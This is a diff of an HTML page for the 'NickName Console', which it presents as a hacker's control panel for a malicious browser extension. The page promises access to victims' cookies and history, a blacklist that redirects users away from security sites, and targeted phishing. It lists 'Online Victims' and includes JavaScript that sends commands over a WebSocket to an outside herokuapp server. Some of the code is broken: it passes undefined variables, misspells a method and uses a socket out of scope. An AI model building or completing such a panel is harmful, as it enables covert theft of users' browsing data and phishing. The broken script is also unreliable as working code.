@@ -3,15 +3,16 @@
   <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>NickName</title>
+    <title>SpeedDemon</title>
     <link rel="stylesheet" href="bootstrap-4.0.0-dist/css/bootstrap.min.css"> 
 	<script src="bootstrap-4.0.0-dist/js/bootstrap.min.js"></script>
-	<link href="style.css" rel="stylesheet">
-  </head> 
+	<link href="style1.css" rel="stylesheet">
+  </head>
+
+  
 
   <body data-spy = "scroll" data-target=".navbar">
-	
-	<!-- Navbar -->
+
 	<nav class="navbar navbar-expand-sm bg-dark navbar-dark fixed-top">
 		<a class="navbar-brand" href="#">NickName123</a>
 		<ul class = "navbar-nav">
@@ -24,87 +25,88 @@
 		</ul>
 	</nav>
 
+	<!-- Logo And Name -->
+	<div class = "jumbotron">
+		<h1 class = "display-4">NickName Console</h1>
+		<p class = "lead">
+			This website is the hacker's gateway to the NickName extension. This interface will allow you to access user cookies and history, create a black list of security sites to redirect users from, and launch targeted phishing and other such scripts at users. Happy hacking!
+		</p>
+		<hr class="my-4">
+		<p>Note: We are not responsible for any privacy breaches, as all permissions have been given by users of our application to access their data.</p>
+	</div>  
+
 	<div class = "ml-5">
-	<div class = "mb-5">
-	<div class = "mr-5">
 
-		<div class = "jumbotron">
-			<h1 class = "display-4">NickName Console</h1>
-			<p class = "lead">
-				This website is the hacker's gateway to the NickName extension. This interface will allow you to access user cookies and history, create a black list of security sites to redirect users from, and launch targeted phishing and other such scripts at users. Happy hacking!
-			</p>
-			<hr class="my-4">
-			<p>Note: We are not responsible for any privacy breaches, as all permissions have been given by users of our application to access their data.</p>
-		</div>  
+	<div id = "userSection">
+	<!-- List of Online Victims -->
+	<h4>User IDs (Click an ID for more info on the user.)</h4>
 
-		<!-- List of Online Victims -->
-		<div id="userSection" class="container-fluid">
-			<h4>User IDs (Click an ID for more info on the user.)</h4>
-			<table class = "table">
-				<thead>
-					<tr>
-						<th scope="col">ID</th>
-						<th scope="col">Status</th>
-					</tr>
-				</thead>
-				<tbody>
-					<tr>
-						<td><a class="user-link" href="infoPage.html">21431904</a></td>
-						<td>Online</td>
-					</tr>
-					<tr>
-						<td><a class="user-link" href="infoPage.html">37928402</a></td>
-						<td>Online</td>
-					</tr>
-					<tr>
-						<td><a class="user-link" href="infoPage.html">57298352</a></td>
-						<td>Online</td>
-					</tr>
+	<table class = "table">
+		<thead>
+			<tr>
+				<th scope="col">ID</th>
+				<th scope="col">Status</th>
+			</tr>
+		</thead>
+		<tbody id="statusTable">
+		</tbody>
+	</table>
+	</div>	
+	<!-- Spacing things Out -->
+	<br>
 
-					<tr>
-						<td><a class="user-link" href="infoPage.html">57298352</a></td>
-						<td>Online</td>
-					</tr>
-					<tr>
-						<td><a class="user-link" href="infoPage.html">57298352</a></td>
-						<td>Online</td>
-					</tr>
-					<tr>
-						<td><a class="user-link" href="infoPage.html">57298352</a></td>
-						<td>Online</td>
-					</tr>
-				</tbody>
-			</table>
-		</div>
 
-		<!-- Adding Blacklisted Site -->
-		<div id=blackListSection class="container-fluid">
-			<h4>Add Site to Blacklist Here</h4>
-			<input type="text" class="form-control blacklist" placeholder="URL">
-			<button class="btn btn-default" type="button" onclick="blackList()">Add Site</button>
+	<!-- Adding Blacklisted Site -->
+	<div id = "blackListSection">
+	<h4>Add Site to Blacklist Here</h4>
+	<input type="text" class="form-control blacklist" placeholder="URL">
+	<button class="btn btn-primary" type="button" onclick="blackList()">Add Site</button>
 
-			<br><br><br>
+	<br><br><br>
 
-			<h4>Blacklisted Sites</h4>
-			<ul class = "list-group">
-				<li class="list-group-item">securitee.org</li>
-			</ul>
-		</div>
+	<h4>Blacklisted Sites</h4>
+	<ul class = "list-group">
+		<li class="list-group-item">securitee.org</li>
+	</ul>
 
-		<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
-		<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
-		<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+	<script>
+	    function blackList(){
+	        var URL = document.getElementById(text);
+	        var HOST = 'wss://projectnickname123.herokuapp.com';
+	        var ws = new WebSocket(HOST);
+	        var jsonPackage = {id: 0, type:'list', addString: URL};
+	        ws.send(JSON.stringify(jsonPackage));
+	    }
+		window.addEventListener("hashchange", function() { scrollBy(0, -70) });
+	</script>
 
-		<script>
-			function blackList(){
-				var URL = document.getElementById(text);
-				var HOST = 'wss://projectnickname123.herokuapp.com';
-				var ws = new WebSocket(HOST);
-				var jsonPackage = {id: 0, type:'list', addString: URL};
-				ws.send(JSON.stringify(jsonPackage));
-			}
-			window.addEventListener("hashchange", function() { scrollBy(0, -70) });
-		</script>
+	<script>
+		function idClick(count){		
+			localStorage.setItem("id", document.getElementById(count).innerHTML);
+		}
+	</script>
+
+	<script>
+		var jsonPackage = {type: statusRequest};
+		ws.send(JSON.stringify(jsonPackage));
+		ws.onmessage = function(e){
+			if(e.type == "status"){
+				object = JSON.parse(e.data);
+				var ids = object.ids;
+				var statusArray = object.statuses;
+				var table = document.getElementById(statusTable);
+				for(i = 0; i < ids.length; i++){
+					var aRow = document.createElement('tr');
+					var idCol = document.createTextNode(ids[i]);
+					var statusCol = document.createTextNode(statusArray[i]);
+					idCol.setAttribute('href', "infoPage.html");
+					table.appendChile(aRow);
+					aRow.appendChild(idCol);
+					aRow.appendChild(statusCol);
+				}
+			}	
+		}
+	</script>
 	
 	</div>
 	</div>
